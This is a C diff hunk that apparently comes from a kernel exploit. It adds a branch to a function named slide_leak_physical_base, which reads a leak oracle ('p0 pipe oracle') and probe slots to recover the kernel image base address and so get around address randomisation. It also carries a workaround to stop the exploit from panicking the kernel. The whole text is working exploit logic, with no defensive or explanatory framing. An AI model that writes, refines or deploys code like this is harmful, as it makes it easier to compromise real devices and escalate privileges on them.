@@ -2493,6 +2493,32 @@ static int slide_leak_physical_base(void) {
       slide_restore_physical_oracle();
       return 0;
     }
+#if defined(APP_SKIP_PROBE_AFTER_GATE_HIT) && APP_SKIP_PROBE_AFTER_GATE_HIT
+    if (p0_pipe_gate_hits_global >= 1 && p0_pipe_gate_changed_global == 0) {
+      pr_info("p0 physical: gate hit, skipping probe slot to avoid rt_mutex chain panic\n");
+      uintptr_t offset = scan_p0_pipe_oracle();
+      if (offset != (uintptr_t)-1) {
+#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
+    APP_P0_FINGERPRINT_INVERSE_SLIDE
+        if (offset > P0_ORACLE_PROBE_OFFSET) {
+          pr_error("p0 fingerprint source offset exceeds probe source=%08zx "
+                   "probe=%08llx\n",
+                   offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
+          slide_restore_physical_oracle();
+          return 0;
+        }
+        uintptr_t source_offset = offset;
+        offset = P0_ORACLE_PROBE_OFFSET - source_offset;
+#endif
+        pr_info("p0 physical gate-only offset=%08zx\n", offset);
+        if (offset && (offset & 0x7fffULL) == 0 && offset <= slide_max_offset) {
+          return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
+        }
+      }
+      slide_restore_physical_oracle();
+      return 0;
+    }
+#endif
     if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
       slide_restore_physical_oracle();
       return 0;
